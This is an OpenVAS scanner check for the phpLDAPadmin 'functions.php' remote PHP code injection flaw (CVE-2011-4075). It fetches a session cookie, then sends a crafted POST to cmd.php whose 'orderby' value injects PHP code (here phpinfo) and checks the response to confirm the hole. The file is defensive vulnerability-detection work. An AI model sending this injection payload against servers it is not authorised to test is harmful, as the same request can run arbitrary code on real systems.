###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpldapadmin_50331.nasl 13 2013-10-27 12:16:33Z jan $
#
# phpLDAPadmin 'functions.php' Remote PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "phpLDAPadmin is prone to a remote PHP code-injection vulnerability.

An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.

phpLDAPadmin versions 1.2.0 through 1.2.1.1 are vulnerable.";


if (description)
{
 script_id(103314);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-10-25 16:57:43 +0200 (Tue, 25 Oct 2011)");
 script_bugtraq_id(50331);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-4075");
 script_name("phpLDAPadmin 'functions.php' Remote PHP Code Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50331");
 script_xref(name : "URL" , value : "http://phpldapadmin.sourceforge.net/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed phpLDAPadmin is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("phpldapadmin_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("phpldapadmin/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(! dir = get_dir_from_kb(port:port,app:"phpldapadmin"))exit(0);

url = string(dir, "/index.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if( buf == NULL ) exit(0);

session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);",string:buf);
if(isnull(session_id[1]))exit(0);
sess = session_id[1];

host = get_host_name();
payload = "cmd=query_engine&query=none&search=1&orderby=foo));}}phpinfo();die;/*";

req = string(
	     "POST ", dir , "/cmd.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Cookie: ", sess, "\r\n",
	     "Content-Length: ", strlen(payload),"\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "Connection: close\r\n",
	     "\r\n",
	     payload
	     );

res = http_send_recv(port:port, data:req);

if("<title>phpinfo()" >< res) {
  security_hole(port:port);
  exit(0);
}
